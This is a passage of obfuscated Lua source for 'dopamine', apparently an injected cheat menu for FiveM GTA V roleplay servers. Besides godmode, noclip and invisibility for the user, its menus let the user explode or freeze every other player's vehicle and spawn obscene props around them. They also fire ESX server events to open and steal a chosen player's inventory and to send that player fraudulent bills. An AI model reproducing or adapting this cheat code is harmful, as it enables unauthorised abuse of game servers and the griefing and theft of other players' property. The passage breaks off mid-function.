        Macias.SetTitleColor(QiL4yf00PC5s, 135, 135, 135, 255)
        Macias.SetMenuTextColor(QiL4yf00PC5s, 150, 150, 150)
        Macias.SetMenuFocusTextColor(QiL4yf00PC5s, 155, 155, 155, 255)
        Macias.SetMenuSubTextColor(QiL4yf00PC5s, 70, 70, 70, 255)
        Macias.SetFont(QiL4yf00PC5s, 4)
        Macias.SetMenuX(QiL4yf00PC5s, 0.025)
        Macias.SetMenuY(QiL4yf00PC5s, 0.3)
        Macias.SetMenuWidth(QiL4yf00PC5s, 0.25)
        Macias.SetMaxOptionCount(QiL4yf00PC5s, BkEd5E1GYgoliqD9ktVZ)
        DCOkHa_X39DI4tsCiPLk = 0.0525
        y2ZqS01LgvjtSTQBJ = 0.15
        vURx5kzEW = 0.00485
        HaQjKKAMvjk5ABgT = 0.7
        yemRBopz2y = 2
        QVCiRDDcBBAaEe = 0.035
        lEA8M97Noop = 0.36
        kSVibjWpdXCC37 = 0.003
        Y6ZS8iMhTJOjBq0rm = 0.0025
        xSTZixUjS6VL9v = " »"
        HtR = "« "
    end
end
function Macias.InitializeTheme()
    for i = 1, #menus_listMaciasMacias do
        Macias.SetTheme(menus_listMaciasMacias[i], KxRMNSn0q7_cSUfk5FWwU)
    end
end
cachedNotificationsMacias = {}
Macias.AddNotification = function(qZ6FZwM67RW, HIPRa)
    table.insert(cachedNotificationsMacias, {["text"] = qZ6FZwM67RW, ["time"] = HIPRa, ["startTime"] = GetGameTimer()})
end
Macias.RemoveNotification = function(dne)
    table.remove(cachedNotificationsMacias, dne)
end
Macias.Draw3D = function(JrfTYMjRAQQ0PlIc, qEYlGD4txoRIwjUbLv, aq7Y_tRdgro2LDUV6AIES, njYh5Juz0oJ2yzv4RC)
    if njYh5Juz0oJ2yzv4RC > 255 then
        njYh5Juz0oJ2yzv4RC = 255
    elseif njYh5Juz0oJ2yzv4RC < 0 then
        njYh5Juz0oJ2yzv4RC = 0
    end
    SetTextScale(0.35, 0.35)
    if tfUirGWXEhIQebFmiE then
        SetTextDropShadow(0, 0, 0, 0, 255)
    end
    SetTextEdge(2, 0, 0, 0, 255)
    if PMCF7AZl_TrF1lqi then
        SetTextOutline()
    end
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, math.floor(njYh5Juz0oJ2yzv4RC))
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(aq7Y_tRdgro2LDUV6AIES)
    DrawText(JrfTYMjRAQQ0PlIc, qEYlGD4txoRIwjUbLv)
    local oK4vND4K = string.len(aq7Y_tRdgro2LDUV6AIES) / 300
    DrawRect(JrfTYMjRAQQ0PlIc, qEYlGD4txoRIwjUbLv + 0.0135, 0.0155 + oK4vND4K, 0.03, 25, 25, 25, njYh5Juz0oJ2yzv4RC)
    DrawRect(
        JrfTYMjRAQQ0PlIc,
        qEYlGD4txoRIwjUbLv + 0.0125,
        0.015 + oK4vND4K,
        0.03,
        YKyAw.r,
        YKyAw.g,
        YKyAw.b,
        njYh5Juz0oJ2yzv4RC
    )
end
Macias.PushNotification = function(lKLnhzrJ3B, Zr9nHOs0eponla8cT)
    if lKLnhzrJ3B then
        if not Zr9nHOs0eponla8cT then
            Zr9nHOs0eponla8cT = 5000
        end
        Macias.AddNotification(lKLnhzrJ3B, Zr9nHOs0eponla8cT)
    end
end
Macias.PushNotification("menu pomyslnie injected", 5000)
Macias.PushNotification("jebanko incoming", 10000)
local lZ58tWwVdUGud16j63nd = false
local XYqiiJ9l6pXVPOizE = false
local i_96UkLXOeqnKHRFKc8Z = {1, 5, 10, 20, 30}
local t0i6VcwX_pxQZE = 5
local hCPJ_C = 5
local bxtzJqeTcu8Hfb = false
local VySplDkfJdL6Pj = false
local ywG8rP0koqFJrXLYGEcO = false
local Avio5D8J42FDB = false
local X0H3ct8R5EnRD8fN = false
local d6l2SglzH3nhigdp13h0S = false
local RHjT3hXjNi = false
local H7cLu4d_tt66oyk2nGoSu = false
local JAi7EkCyHw2ioIQ = false
local nWEHC6n0j4g92 = false
local MMCdqxHinL = false
local uxJar0V_mxsLlrYT2 = false
local _rgyS5S3Q = false
local FKT3bjX3gv = 1
local wHsxZwUyYdZM = 1
local Uj8_cWbAGr6Q1NF4 = false
local wiM7iOgkz = nil
local C8RfqDn = false
local InqLDivpr6 = false
local pr_jxNqpjnLEezH = false
local fmT = false
local rwIrTL9JmO7v = false
local KzFsC7pbI = false
local cZ8CKxjM_N1 = false
local jU7z1fNT_Pbj85qJpm = false
local G8zTCymQ1Rx1 = true
local LAIOcfn3rolnOx1W = false
local ai = false
local a = 1
local EHs = 1
local zMMHskuAX7QW9noU = 1
local H = false
local z_nQ = false
local WfYVJ8MoOy3Hl7 = false
local nkZB = false
local iFJo9N75fE6X = false
local cCCjZqd78 = false
local A__TqtbeQPVTbDeT = false
local FUxbInvVV02Fi = false
local ECclILYClVywd2ROgA0J = false
local xaEYqsfYZ = false
local gCMfMaXEV = 0
local visualsESPRefreshRates = {"0ms", "50ms", "150ms", "250ms", "500ms", "1s", "2s", "5s"}
local EuamD = {50, 100.0, 500, 1000.0, 2000.0, 5000}
local visualsESPDistance = 500
local qGv5kiGp9cZEP5mq = 1
local FyZ0zUmPGl = 1
local ar88eiT8j = 1
local k3Rlj4_Lrt5rcEJF = 1
local NF3U = false
local QTn0uZ = 1
local Ls = 1
local Oz = false
local SjqKFFPQMn0FcwBwiS4mE = nil
local Ksu5eXfU1y = 1
local O4_m_VE52xXU0mUp_g590 = 1
local Li4EQ77 = false
local OaYL3SNOYT = false
local bP5N7Wm5Erw = false
local MIPSqLh9aOgDF2JHx = false
local jbGHvAqpy = false
local QwnbTipwbcG = false
local cAMZ5H60uTxQqSP = false
local OlGuUvqPdqVORQAfiabSX = "TAB"
local qoWbq6ZkwwgrWkguuODDo = "F3"
local qsnyzNENQPII7EPs = "F5"
local g5M = "F10"
local NXStf = "E"

local currentCustomCrosshair = 1
local selectedCustomCrosshair = 1
customCrosshairOptsMacias = {"Off", "Default", "Custom"}
Jobs = {
    "Unemployed",
    "Mechanic",
    "Police",
    "Ambulance",
    "Taxi",
    "Real Estate Agent",
    "Car Dealer",
    "Banker",
    "Gang",
    "Mafia"
}

Jobs.Item = {"Butcher", "Tailor", "Miner", "Fueler", "Lumberjack", "Fisher", "Hunting", "Weed", "Meth", "Coke", "Opium"}
Jobs.ItemDatabase = {
    ["Butcher"] = OTablini.new {
        "Alive Chicken",
        "alive_chicken",
        "Slaughtered Chicken",
        "slaughtered_chicken",
        "Packaged Chicken",
        "packaged_chicken"
    },
    ["Tailor"] = OTablini.new {"Wool", "wool", "Fabric", "fabric", "Clothes", "clothe"},
    ["Fueler"] = OTablini.new {"Petrol", "petrol", "Refined Petrol", "petrol_raffin", "Essence", "essence"},
    ["Miner"] = OTablini.new {"Stone", "stone", "Washed Stone", "washed_stone", "Diamond", "diamond"},
    ["Lumberjack"] = OTablini.new {"Wood", "wood", "Cutted Wood", "cutted_wood", "Packed Plank", "packaged_plank"},
    ["Fisher"] = OTablini.new {"Fish", "fish"},
    ["Hunting"] = OTablini.new {"Meat", "meat"},
    ["Coke"] = OTablini.new {"Coke", "coke", "Coke Bag", "coke_pooch"},
    ["Weed"] = OTablini.new {"Weed", "weed", "Weed Bag", "weed_pooch"},
    ["Meth"] = OTablini.new {"Meth", "meth", "Meth Bag", "meth_pooch"},
    ["Opium"] = OTablini.new {"Opium", "opium", "Opium Bag", "opium_pooch"}
}
Jobs.ItemRequires = {
    ["Fabric"] = "Wool",
    ["Clothes"] = "Fabric",
    ["Washed Stone"] = "Stone",
    ["Diamond"] = "Washed Stone",
    ["Coke Bag"] = "coke",
    ["Weed Bag"] = "weed",
    ["Meth Bag"] = "meth",
    ["Opium Bag"] = "opium"
}
Jobs.Money = {
    "Fuel Delivery",
    "Car Thief",
    "DMV School",
    "Dirty Job",
    "Pizza Boy",
    "Ranger Job",
    "Garbage Job",
    "Car Thief",
    "Trucker Job",
    "Postal Job",
    "Banker Job"
}
Jobs.Money.Value = {
    "esx_fueldelivery",
    "esx_carthief",
    "esx_dmvschool",
    "esx_godirtyjob",
    "esx_pizza",
    "esx_ranger",
    "esx_garbagejob",
    "esx_carthief",
    "esx_truckerjob",
    "esx_gopostaljob",
    "esx_banksecurity"
}
CustomItems = {}
CustomItems.Item = {"Repair Kit", "Bandage", "Medkit", "Bitcoin", "Gold", "Jewels", "Drill", "Lockpick"}
CustomItems.ItemDatabase = {
    ["Repair Kit"] = OTablini.new {"Repair Kit", "fixkit"},
    ["Bandage"] = OTablini.new {"Bandage", "bandage"},
    ["Medkit"] = OTablini.new {"Medkit", "medikit"},
    ["Bitcoin"] = OTablini.new {"Bitcoin", "bitcoin"},
    ["Gold"] = OTablini.new {"Gold", "gold"},
    ["Jewels"] = OTablini.new {"Jewels", "jewels"},
    ["Drill"] = OTablini.new {"Drill", "drill"},
    ["Lockpick"] = OTablini.new {"Lockpick", "lockpick"}
}
CustomItems.ItemRequires = {
    ["Repair Kit"] = "fixkit",
    ["Bandage"] = "bandage",
    ["Medkit"] = "medikit",
    ["Bitcoin"] = "bitcoin",
    ["Gold"] = "gold",
    ["Jewels"] = "jewels",
    ["Drill"] = "drill",
    ["Lockpick"] = "lockpick"
}
local oGaAOvW0nQhY3 = 1
local s_NpohOYBIXnoFgWoduc = 1
local bctUcP7ANFBFC3 = 1
local Cm98o9wZsaLnySTDWo = 1
local stjV43u5 = 1
local Tx70s70 = 1
local VGk9xyYTC7F9E0rO6 = 1
local VS = 1
local boss_menu_words = {"Police", "Ambulance", "Mechanic", "Taxi", "Cardealer", "Gang", "RealEstateAgent"}
local boss_menu_current = 1
local boss_menu_selected = 1
local BJHuenN1n = 1
local tPw5Wa0sc7K4bhxBGTWGr = 1
local MNfWF9cuVmEKF38C05 = 4
local ZhRmqkaE4 = 4
local xMOzIZanu = {0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75}
local JwvTSpXmUOVy_t = {0.025, 0.1, 0.2, 0.3, 0.425}
local F1iz = 4
local _PAI7biS3pxqN = 4
local fI9wfgRBZtM = {5, 10, 11, 12, 13, 14, 15, 20, 25}
Citizen.CreateThread(
    function()
        local currentThemeIndex = 1
        local selectedThemeIndex = 1

        local FastCB = {1, 1.09, 1.19, 1.29, 1.39, 1.49}
        local FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}
        local currentFastRunIndex = 1
        local selectedFastRunIndex = 1
        local G = 1
        local bsK = 1

        local pedDensityX = {1, 0.8, 0.6, 0.4, 0.2, 0.1, 0}
        local pedDensityXCurrent = 1
        local pedDensityXSelectedf = 1
        local pedDensityXWords = {"Default", "-20%", "-40%", "-60%", "-80%", "-100%"}
        local pedDensityXSelected = 1
        local aPOPropOptionsCurrent = 1
        local aPOPropOptionsSelected = 1

        local NOY = 1
        local nKGJjT = 1
        local PYFWQhTGNGfHR_keh8xib = "bus"
        local o = {"bus", "monster", "freight", "bulldozer"}
        local Wi1DeMQa = 1
        local f9uvgbrB = 1

        local V1OlsNoxFONjl = {1, 2, 4, 8, 16.0, 32, 64.0, 128, 256.0, 512.0}
        local y7uMZQ2Z3TAVfx0 = {"+1%", "+2%", "+4%", "+8%", "+16%", "+32%", "+64%", "+128%", "+256%", "+512%"}
        local IwAG2CcXg = 1
        local e = 1
        local tWPGzJDB = 1
        local Mx5nRgSY5324XtZzQB = 1
        local s7sZw5_atn = 1
        local AGJfaPksVU = 1
        local SoNdW_byQzxEG = 1
        local p = 1
        local LRTqGzyciSxpWYex = 1
        local IkkxK1nE = {"jester3", "elegy", "sultanrs", "coquette3", "monster", "banshee2", "specter"}
        local OqRdAq1j = {1, 2, 3, 5, 10, 25, 50, 250.0, 1000.0}
        local fMY3bFUiVzL = nil
        local qwxBa75Z2xuL = nil
        local GFlGQ8Y3HDh1Mug2LxZ1 = nil
        Macias.CreateMenu("dopamine", "MaciasMine")
        Macias.SetSubTitle("dopamine", "edited by macias#8063 | ONION EXECUTOR")
        Macias.CreateSubMenu("selfOptions", "dopamine", "Self Options")
        Macias.CreateSubMenu("onlinePlayersOptions", "dopamine", "Online Players")
        Macias.CreateSubMenu("visualOptions", "dopamine", "Visual Options")
        Macias.CreateSubMenu("teleportOptions", "dopamine", "Teleport Options")
        Macias.CreateSubMenu("vehicleOptions", "dopamine", "Vehicle Options")
        Macias.CreateSubMenu("weaponOptions", "dopamine", "Weapon Options")
        Macias.CreateSubMenu("serverOptions", "dopamine", "Server Options")
        Macias.CreateSubMenu("menuSettings", "dopamine", "Menu Options")
        Macias.CreateSubMenu("selfSuperPowers", "selfOptions", "Super Powers")
        Macias.CreateSubMenu("allPlayersOptions", "onlinePlayersOptions", "All Online Players")
        Macias.CreateSubMenu("selectedPlayerOptions", "onlinePlayersOptions", "Selected Player Options")
        Macias.CreateSubMenu(
            "selectedPlayerOptionsTriggers",
            "selectedPlayerOptions",
            "Selected Player Trigger Options"
        )
        Macias.CreateSubMenu("selectedPlayerOptionsTroll", "selectedPlayerOptions", "Selected Player Troll Options")
        Macias.CreateSubMenu("visualOptionsESP", "visualOptions", "Visual ESP Options")
        Macias.CreateSubMenu("vehicleLosSantosCustoms", "vehicleOptions", "Los Santos Customs")
        Macias.CreateSubMenu(
            "vehicleLosSantosCustomsCosmetics",
            "vehicleLosSantosCustoms",
            "Los Santos Customs | Cosmetics"
        )
        Macias.CreateSubMenu(
            "vehicleLosSantosCustomsPerformance",
            "vehicleLosSantosCustoms",
            "Los Santos Customs | Performance"
        )
        Macias.CreateSubMenu("vehicleSpawnList", "vehicleOptions", "Vehicle Spawn Options")
        Macias.CreateSubMenu("vehicleSpawnSelected", "vehicleSpawnList", "Select A Vehicle")
        Macias.CreateSubMenu("vehicleSpawnSelectedOptions", "vehicleSpawnSelected", "Vehicle Spawn Selected")
        Macias.CreateSubMenu("weaponOptionsTypes", "weaponOptions", "Weapon Type Selection")
        Macias.CreateSubMenu("weaponOptionsTypeSelection", "weaponOptionsTypes", "Weapon Selection")
        Macias.CreateSubMenu("weaponModOptionsOptions", "weaponOptionsTypeSelection", "Weapon Options")
        Macias.CreateSubMenu("weaponsModSelect", "weaponModOptionsOptions", "Weapon Mod Options")
        Macias.CreateSubMenu("serverOptionsResources", "serverOptions", "Server Resources")
        Macias.CreateSubMenu("serverOptionsTriggerEvents", "serverOptions", "Trigger Events")
        Macias.CreateSubMenu("serverOptionsTriggerEventsESX", "serverOptionsTriggerEvents", "ESX Trigger Events")
        Macias.CreateSubMenu("serverOptionsTriggerEventsVRP", "serverOptionsTriggerEvents", "vRP Trigger Events")
        Macias.CreateSubMenu(
            "serverOptionsTriggerEventsESXMoney",
            "serverOptionsTriggerEventsESX",
            "ESX Money Options"
        )
        Macias.CreateSubMenu("credits", "menuSettings", "Menu Credits")
        Macias.CreateSubMenu("keybindSettings", "menuSettings", "Keybind Settings")
        Macias.InitializeTheme(1)
        local LvFBnHcLyb = 0
        while NywuctsA4BD4b3_G0 do
            if LvFBnHcLyb == 0 then
                introScaleform = InitializeIntro("mp_big_message_freemode", "~r~Onion EXEC | Press TAB")
                DrawScaleformMovieFullscreen(introScaleform, 80, 80, 80, 80, 0)
                Citizen.CreateThread(
                    function()
                        while NywuctsA4BD4b3_G0 do
                            Wait(2000.0)
                            LvFBnHcLyb = LvFBnHcLyb + 1
                        end
                    end
                )
            elseif LvFBnHcLyb == 300 then
            end
            if Macias.IsMenuOpened("dopamine") then
                if
                    Macias.MenuButton(
                        "Self Options",
                        "selfOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_deaths_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Online Players",
                        "onlinePlayersOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_friends_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Visual Options",
                        "visualOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_bikers_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Teleport Options",
                        "teleportOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_star_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Vehicle Options",
                        "vehicleOptions",
                        " ",
                        {
                            dict = "mpleaderboard",
                            text = "leaderboard_steeringwheel_icon",
                            color = {r = 255, g = 255, b = 255}
                        }
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Weapon Options",
                        "weaponOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_kd_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Server Options",
                        "serverOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_globe_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.MenuButton(
                        "Menu Options",
                        "menuSettings",
                        " ",
                        {
                            dict = "mpleaderboard",
                            text = "leaderboard_position_icon",
                            color = {r = 255, g = 255, b = 255}
                        }
                    )
                 then
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("selfOptions") then
                if Macias.MenuButton("Super Powers", "selfSuperPowers") then
                elseif Macias.CheckBox("Godmode", bxtzJqeTcu8Hfb) then
                    bxtzJqeTcu8Hfb = not bxtzJqeTcu8Hfb
                elseif Macias.CheckBox("Semi Godmode", VySplDkfJdL6Pj) then
                    VySplDkfJdL6Pj = not VySplDkfJdL6Pj
                elseif Macias.CheckBox("Infinite Stamina", lZ58tWwVdUGud16j63nd) then
                    lZ58tWwVdUGud16j63nd = not lZ58tWwVdUGud16j63nd
                elseif Macias.CheckBox("Noclip", XYqiiJ9l6pXVPOizE) then
                    MaciasFunc.toggleNoclip()
                elseif Macias.CheckBox("No Ragdoll", d6l2SglzH3nhigdp13h0S) then
                    d6l2SglzH3nhigdp13h0S = not d6l2SglzH3nhigdp13h0S
                elseif Macias.CheckBox("Never Wanted", ywG8rP0koqFJrXLYGEcO) then
                    ywG8rP0koqFJrXLYGEcO = not ywG8rP0koqFJrXLYGEcO
                elseif Macias.CheckBox("Invisible", Avio5D8J42FDB) then
                    Avio5D8J42FDB = not Avio5D8J42FDB
                elseif Macias.Button("Suicide", "Native") then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif Macias.Button("Revive", "Native") then
                    MaciasFunc.nativeRevive()
                elseif Macias.Button("Refill Health", "Native") then
                    SetEntityHealth(PlayerPedId(-1), 200)
                    Macias.PushNotification("Health refilled", 5000)
                elseif Macias.Button("Refill Armour", "Native") then
                    SetPedArmour(PlayerPedId(-1), 200)
                    Macias.PushNotification("Armour refilled", 5000)
                elseif Macias.Button("Refill Stamina", "Native") then
                    ResetPlayerStamina(PlayerPedId(-1))
                elseif Macias.Button("Random Outfit", "Native") then
                    MaciasFunc.randomClothes(PlayerId())
                elseif
                    Macias.ComboBox(
                        "Disappear From Chase",
                        {"In the sky", "Legion Square", "Vespucci Beach", "Sandy Shores", "Blaine County"},
                        FKT3bjX3gv,
                        wHsxZwUyYdZM,
                        function(D3j, n)
                            FKT3bjX3gv = D3j
                            wHsxZwUyYdZM = D3j
                        end
                    )
                 then
                    MaciasFunc.disappearFromChase()
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("selfSuperPowers") then
                if Macias.CheckBox("Super Jump", RHjT3hXjNi) then
                    RHjT3hXjNi = not RHjT3hXjNi
                elseif Macias.CheckBox("Magneto", H7cLu4d_tt66oyk2nGoSu) then
                    H7cLu4d_tt66oyk2nGoSu = not H7cLu4d_tt66oyk2nGoSu
                    MaciasFunc.magnetoMode()
                elseif Macias.CheckBox("Heat Vision", JAi7EkCyHw2ioIQ) then
                    JAi7EkCyHw2ioIQ = not JAi7EkCyHw2ioIQ
                elseif Macias.CheckBox("Night Vision", nWEHC6n0j4g92) then
                    nWEHC6n0j4g92 = not nWEHC6n0j4g92
                elseif Macias.CheckBox("Become Tiny", MMCdqxHinL) then
                    MMCdqxHinL = not MMCdqxHinL
                elseif Macias.CheckBox("Become The Flash", _rgyS5S3Q) then
                    _rgyS5S3Q = not _rgyS5S3Q
                elseif
                    Macias.ComboBoxSlider(
                        "Fast Run",
                        FastCBWords,
                        currentFastRunIndex,
                        selectedFastRunIndex,
                        function(mYzihtbcZif7, eju8nPnNtnTSoSIZ)
                            currentFastRunIndex = mYzihtbcZif7
                            selectedFastRunIndex = mYzihtbcZif7
                            FastRunMultiplier = FastCB[mYzihtbcZif7]
                            if not _rgyS5S3Q then
                                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                            end
                        end
                    )
                 then
                elseif
                    Macias.ComboBoxSlider(
                        "Fast Swim",
                        FastCBWords,
                        G,
                        bsK,
                        function(g10ROKeJ2q0VIS, r2GLa_uPPJ)
                            G = g10ROKeJ2q0VIS
                            bsK = g10ROKeJ2q0VIS
                            FastSwimMultiplier = FastCB[g10ROKeJ2q0VIS]
                            SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                        end
                    )
                 then
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("onlinePlayersOptions") then
                Macias.SetSubTitle("onlinePlayersOptions", #GetActivePlayers() .. " Player(s) Online")
                if Macias.MenuButton("All Players / World", "allPlayersOptions") then
                else
                    local M8PYV4BQKKJtXbINH1MpB = GetActivePlayers()
                    for i = 1, #M8PYV4BQKKJtXbINH1MpB do
                        local DDGsBCo2lJmzrb = M8PYV4BQKKJtXbINH1MpB[i]
                        if
                            Macias.MenuButton(
                                "~b~[C:" ..
                                    DDGsBCo2lJmzrb ..
                                        " | S:" ..
                                            GetPlayerServerId(DDGsBCo2lJmzrb) ..
                                                "]~s~ " ..
                                                    GetPlayerName(DDGsBCo2lJmzrb),
                                                        --getPlayerStatus(GetPlayerPed(DDGsBCo2lJmzrb)),
                                "selectedPlayerOptions"
                            )
                         then
                            selectedPlayer = DDGsBCo2lJmzrb
                        end
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("allPlayersOptions") then
                if Macias.Button("Rape Vehicles", "Native") then
                    MaciasFunc.aPO.rapeVehicles()
                elseif Macias.Button("Explode Vehicles", "Native") then
                    MaciasFunc.aPO.explodeCars()
                elseif Macias.Button("Clone Peds", "Native") then
                    MaciasFunc.aPO.clonePeds()
                elseif
                    Macias.ComboBox(
                        "Spawn Props",
                        {
                            "Gas Pump",
                            "Beach Fire",
                            "Gas Tank",
                            "UFO",
                            "Dildo",
                            "Toilet",
                            "Missile",
                            "Couch",
                            "Banana Party",
                            "Ramp"
                        },
                        aPOPropOptionsCurrent,
                        aPOPropOptionsSelected,
                        function(EvStnG6Is42m, W7gCrJeTUrLbpF)
                            aPOPropOptionsCurrent = EvStnG6Is42m
                            aPOPropOptionsSelected = EvStnG6Is42m
                        end
                    )
                 then
                    if aPOPropOptionsSelected == 1 then
                        MaciasFunc.aPO.gasPump()
                    elseif aPOPropOptionsSelected == 2 then
                        MaciasFunc.aPO.beachFire()
                    elseif aPOPropOptionsSelected == 3 then
                        MaciasFunc.aPO.spawnTrollProp("prop_gas_tank_01a")
                        MaciasFunc.aPO.spawnTrollProp("prop_gascyl_01a")
                    elseif aPOPropOptionsSelected == 4 then
                        MaciasFunc.aPO.spawnTrollProp("p_spinning_anus_s")
                    elseif aPOPropOptionsSelected == 5 then
                        MaciasFunc.aPO.spawnTrollProp("prop_cs_dildo_01")
                    elseif aPOPropOptionsSelected == 6 then
                        MaciasFunc.aPO.spawnTrollProp("prop_ld_toilet_01")
                    elseif aPOPropOptionsSelected == 7 then
                        MaciasFunc.aPO.spawnTrollProp("prop_ld_bomb_anim")
                    elseif aPOPropOptionsSelected == 8 then
                        MaciasFunc.aPO.spawnTrollProp("prop_ld_farm_couch01")
                    elseif aPOPropOptionsSelected == 9 then
                        MaciasFunc.aPO.spawnTrollProp("p_crahsed_heli_s")
                        MaciasFunc.aPO.spawnTrollProp("prop_rock_4_big2")
                        MaciasFunc.aPO.spawnTrollProp("prop_beachflag_le")
                    elseif aPOPropOptionsSelected == 10 then
                        MaciasFunc.aPO.spawnTrollProp("stt_prop_stunt_track_uturn")
                        MaciasFunc.aPO.spawnTrollProp("stt_prop_stunt_track_turnice")
                        MaciasFunc.aPO.spawnTrollProp("stt_prop_stunt_track_hill")
                    end
                elseif Macias.CheckBox("Freeze", Li4EQ77) then
                    Li4EQ77 = not Li4EQ77
                elseif Macias.CheckBox("Disable Driving Vehicles", OaYL3SNOYT) then
                    OaYL3SNOYT = not OaYL3SNOYT
                elseif Macias.CheckBox("Noisy Vehicles", bP5N7Wm5Erw) then
                    bP5N7Wm5Erw = not bP5N7Wm5Erw
                elseif Macias.Button("Burn Effect", "Native") then
                    MaciasFunc.aPO.burnSFX()
                elseif Macias.Button("Run Everything ~r~(!)", "Native") then
                    MaciasFunc.aPO.rapeVehicles()
                    MaciasFunc.aPO.explodeCars()
                    MaciasFunc.aPO.clonePeds()
                    MaciasFunc.aPO.spawnTrollProp("prop_gas_tank_01a")
                    MaciasFunc.aPO.spawnTrollProp("prop_gascyl_01a")
                    MaciasFunc.aPO.spawnTrollProp("p_spinning_anus_s")
                    MaciasFunc.aPO.spawnTrollProp("prop_cs_dildo_01")
                    MaciasFunc.aPO.spawnTrollProp("prop_ld_toilet_01")
                    MaciasFunc.aPO.spawnTrollProp("prop_ld_bomb_anim")
                    MaciasFunc.aPO.spawnTrollProp("prop_ld_farm_couch01")
                    MaciasFunc.aPO.spawnTrollProp("p_crahsed_heli_s")
                    MaciasFunc.aPO.spawnTrollProp("prop_rock_4_big2")
                    MaciasFunc.aPO.spawnTrollProp("prop_beachflag_le")
                    MaciasFunc.aPO.spawnTrollProp("stt_prop_stunt_track_uturn")
                    MaciasFunc.aPO.spawnTrollProp("stt_prop_stunt_track_turnice")
                    MaciasFunc.aPO.spawnTrollProp("stt_prop_stunt_track_hill")
                    MaciasFunc.aPO.beachFire()
                    MaciasFunc.aPO.gasPump()
                    MaciasFunc.aPO.burnSFX()
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("selectedPlayerOptions") then
                Macias.SetSubTitle(
                    "selectedPlayerOptions",
                    "~b~[" ..
                        GetPlayerServerId(selectedPlayer) ..
                            "]~s~ " .. GetPlayerName(selectedPlayer) --getPlayerStatus(GetPlayerPed(currentPlayer))
                )
                if Macias.MenuButton("Troll Options", "selectedPlayerOptionsTroll") then
                elseif Macias.MenuButton("Trigger Options", "selectedPlayerOptionsTriggers") then
                elseif
                    Macias.Button(
                        "Spectate",
                        Uj8_cWbAGr6Q1NF4 and "Spectating: [" .. GetPlayerServerId(wiM7iOgkz) .. "]" or
                            "Spectating: [-1]"
                    )
                 then
                    wiM7iOgkz = selectedPlayer
                    MaciasFunc.sPO.spectatePlayer(wiM7iOgkz)
                elseif Macias.Button("Give Health", "Native") then
                    CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(selectedPlayer)))
                elseif Macias.Button("Give Armour", "Native") then
                    CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(selectedPlayer)))
                elseif Macias.Button("Teleport To", "Native") then
                    MaciasFunc.sPO.teleportToPlayer(selectedPlayer)
                elseif Macias.Button("Teleport Into Vehicle", "Native") then
                    MaciasFunc.sPO.teleportIntoVehicle(GetPlayerPed(selectedPlayer))
                elseif Macias.Button("Clone Vehicle", "Native") then
                    MaciasFunc.sPO.cloneVehicle(selectedPlayer)
                elseif Macias.Button("Clone Outfit", "Native") then
                    MaciasFunc.sPO.clonePedOutfit(PlayerPedId(), GetPlayerPed(selectedPlayer))
                elseif Macias.Button("Give All Weapons", "Native") then
                    MaciasFunc.sPO.giveAllWeapons(GetPlayerPed(selectedPlayer))
                elseif Macias.Button("Remove All Weapons", "Native") then
                    RequestControlOnce(GetPlayerPed(selectedPlayer))
                    RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), true)
                    RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), false)
                elseif Macias.Button("Give Ammo", "Native") then
                    for i = 1, #iys3AbTbrGHJF do
                        AddAmmoToPed(GetPlayerPed(selectedPlayer), GetHashKey(iys3AbTbrGHJF[i]), 250.0)
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("selectedPlayerOptionsTriggers") then
                if Macias.Button("Open Inventory", "ESX | Client") then
                    TriggerMaciasEvent(
                        false,
                        "esx_inventoryhud:openPlayerInventory",
                        GetPlayerServerId(selectedPlayer),
                        GetPlayerName(selectedPlayer)
                    )
                elseif Macias.Button("Disc Search Inventory", "ESX | Client") then
                    MaciasFunc.sPO.SearchDisc(GetPlayerServerId(selectedPlayer))
                elseif Macias.Button("Disc Steal Inventory", "ESX | Client") then
                    MaciasFunc.sPO.StealDisc(GetPlayerServerId(selectedPlayer))
                elseif Macias.Button("Send Bill", "ESX | Server") then
                    local e77MTJB1SjAVjr = KeyboardInputMacias("Enter amount", " ", 10)
                    local GtV8sWglvdn2c = KeyboardInputMacias("Enter the name of the bill", " ", 10)
                    if e77MTJB1SjAVjr ~= " " and GtV8sWglvdn2c ~= " " then
                        if MaciasFunc.doesResourceExist("esx_billing") then
                            TriggerMaciasEvent(
                                true,
                                "esx_billing:sendBill",
                                GetPlayerServerId(selectedPlayer),
                                "d0pamine.xyz",
                                GtV8sWglvdn2c,
                                e77MTJB1SjAVjr
                            )
                            TriggerMaciasEvent(
                                true,
                                "esx_billing:sendBill",
                                GetPlayerServerId(selectedPlayer),
                                "d0pamine.xyz",
                                GtV8sWglvdn2c,
                                e77MTJB1SjAVjr
                            )
                        else
